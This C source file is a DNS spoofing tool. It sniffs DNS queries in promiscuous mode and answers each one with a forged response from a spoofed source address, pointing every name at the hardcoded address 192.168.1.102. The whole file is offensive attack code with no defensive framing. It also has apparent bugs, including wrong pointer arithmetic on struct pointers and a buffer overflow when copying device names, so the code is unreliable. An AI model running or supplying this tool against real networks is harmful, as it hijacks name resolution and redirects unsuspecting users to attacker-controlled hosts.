#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "header.h"
#include "dns.h"

#include <sys/socket.h>
#include <arpa/inet.h>

//some global counter
//int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
int total = 0;

#define BUF_SIZE 65536

void process_packet(u_char *, const struct pcap_pkthdr *, const u_char *);

int main(int argc, char *argv[])
{
    pcap_t *handle;
    pcap_if_t *all_dev, *dev;

    char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
    char *dev_name;
    bpf_u_int32 net_ip, mask;   /* The netmask of our sniffing device and the ip of our device*/
    struct bpf_program fp;      /* The compiled filter expression */
    char filter_exp[] = "udp port 53";  /* The filter expression */

    //get all available devices
    if(pcap_findalldevs(&all_dev, err_buf))
    {
        fprintf(stderr, "Unable to find devices: %s", err_buf);
        exit(1);
    }

    if(all_dev == NULL)
    {
        fprintf(stderr, "No device found. Please check that you are running with root \n");
        exit(1);
    }

    printf("Available devices list: \n");
    int c = 1;

    for(dev = all_dev; dev != NULL; dev = dev->next)
    {
        printf("#%d %s : %s \n", c, dev->name, dev->description);
        if(dev->name != NULL)
        {
            strncpy(dev_list[c], dev->name, strlen(dev->name));
        }
        c++;
    }



    printf("Please choose the monitoring device (e.g., en0):\n");
    dev_name = malloc(20);
    fgets(dev_name, 20, stdin);
    *(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

    //look up the chosen device
    int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
    if(ret < 0)
    {
        fprintf(stderr, "Error looking up net: %s \n", dev_name);
        exit(1);
    }

    struct sockaddr_in addr;
    addr.sin_addr.s_addr = net_ip;
    char ip_char[100];
    inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    printf("NET address: %s\n", ip_char);

    addr.sin_addr.s_addr = mask;
    memset(ip_char, 0, 100);
    inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
    printf("Mask: %s\n", ip_char);

    //open the device
    //
    //   pcap_t *pcap_open_live(char *device,int snaplen, int prmisc,int to_ms,
    //   char *ebuf)
    //
    //   snaplen - maximum size of packets to capture in bytes
    //   promisc - set card in promiscuous mode?
    //   to_ms - time to wait for packets in miliseconds before read
    //   times out
    //   errbuf - if something happens, place error string here
    //
    //   Note if you change "prmisc" param to anything other than zero, you will
    //   get all packets your device sees, whether they are intendeed for you or
    //   not!! Be sure you know the rules of the network you are running on
    //   before you set your card in promiscuous mode!!

    handle = pcap_open_live(dev_name, BUF_SIZE, 1, 1, err_buf);

    //Create the handle
    // if (!(handle = pcap_create(dev_name, err_buf))){
    //   fprintf(stderr, "Pcap create error : %s", err_buf);
    //   exit(1);
    // }

    // pcap_set_timeout(handle, 1000); // Timeout in milliseconds 

    // //If the device can be set in monitor mode (WiFi), we set it.
    // if (pcap_can_set_rfmon(handle)==1){
    //   if (pcap_set_rfmon(handle, 1))
    //   pcap_perror(handle,"Error while setting monitor mode");
    // } 

    // if(pcap_set_promisc(handle,1)) //also promiscuous mode
    //   pcap_perror(handle,"Error while setting promiscuous mode");

    // //Setting timeout for processing packets to 1 ms
    // if (pcap_set_timeout(handle, 1))
    //   pcap_perror(handle,"Pcap set timeout error");

    // //Activating the sniffing handle
    // if (pcap_activate(handle))
    //   pcap_perror(handle,"Pcap activate error");

    if(handle == NULL)
    {
        fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
        exit(1);
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }

    printf("Device %s is opened. Begin sniffing...\n", dev_name);

    //printf("TCP : %d UDP : %d ICMP : %d IGMP : %d Others : %d Total : %d\n\r", tcp , udp , icmp , igmp , others , total);

    logfile=fopen("log.txt","w");
    if(logfile==NULL)
    {
        printf("Unable to create file.");
    }
    //printf("logfile opened\n");

    //Put the device in sniff loop
    pcap_loop(handle , -1 , process_packet , NULL);

    pcap_close(handle);

    return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
    printf("a packet is received! %d \n", total++);
    int l = header->len;

    ++total;
    print_udp_packet(buffer , l);

    //get the information src_ip src_port dest_ip dest_port dns query

    //Get the IP Header part of this packet , excluding the ethernet header
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr)); 
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
    unsigned short iphdrlen = iph->ihl*4;

    struct udphdr *udph = (struct udphdr*)(buffer + iphdrlen  + sizeof(struct ethhdr));
    u_int16_t src_port = udph->source;
    u_int16_t dest_port = udph->dest;

    //dns_header *dns = (dns_header*)(udph + sizeof(struct udphdr));
    res_record answers[10], auth[10], addit[10];
    query queries[10];
    int id = parse_dns_query((uint8_t*)(udph + sizeof(struct udphdr)), queries, answers, auth, addit);

    //prepare the packet: raw_ip+dns_response
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }

    char packet[BUF_SIZE];
    memset(packet, 0, BUF_SIZE);

    //build dns response
    dns_header *dns = (dns_header*)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
    int size = 0;
    build_dns_header(dns, id, 1, 1, 1, 0, 0);

    //we construct 1 question section
    uint8_t *qname = (uint8_t*)(dns+sizeof(dns_header));
    size += sizeof(dns_header);
    int offset = 0;

    for(int i=0;i<ANS_SIZE;i++)
    {
        if(queries[i].qname == NULL)
            break;

        build_name_section(qname, (char*)(queries[i].qname), &offset);
        size += offset;

        question *qdata = (question*)(qname + offset);

        qdata->qtype = htons(TYPE_A);
        qdata->qclass = htons(CLASS_IN);
        size += 4;
        qname = (uint8_t*)qdata + 4;
    }

    //1 answer section

    //host name
    build_name_section(qname, (char*)queries[0].qname, &offset); //the first query
//      get_dns_name(qname, (uint8_t*)host_name);
//      *position = strlen((char*)qname) + 1; //calculate the offset

    size += offset;

    //fixed size section
    r_element *r = (r_element*)(qname + offset);
    r->type = htons(TYPE_A);
    r->_class = htons(CLASS_IN);
    r->ttl = htonl(255);
    r->rdlength = htons(4);
    size += 10; //attention: we can't use sizeof(r_element) !!!

    uint8_t *addr = (uint8_t*)(r) + 10;

    //address

    char *address_array = "192.168.1.102"; //the answer to put...

    inet_pton(AF_INET, address_array, addr);
    size += IN_SIZE;

    //IP header pointer
    iph = (struct iphdr *)packet;
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len=htons(size + sizeof(struct iphdr) + sizeof(struct udphdr));
    iph->id = htons(0);
    iph->frag_off = 0;
    iph->ttl = 255; //time to live is eight
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));
    iph->saddr = dest.sin_addr.s_addr;
    iph->daddr = source.sin_addr.s_addr;

    //UDP header pointer
    udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    udph->source = dest_port;
    udph->dest = src_port;
    udph->len = htons(sizeof(struct udphdr)+size);
    udph->check = 0;
    udph->check = udp4_checksum (*iph, *udph, (uint8_t *)dns, size);
    //struct pseudo_udp_header psh; //pseudo header

    //send the packet
    source.sin_family = AF_INET;
    source.sin_port = htons(53);
    if (sendto (fd, packet, size + sizeof(struct iphdr) + sizeof(struct udphdr), 0, (struct sockaddr *) &source, sizeof (struct sockaddr)) < 0)  {
        perror ("sendto() failed ");
        exit (EXIT_FAILURE);
    }  

}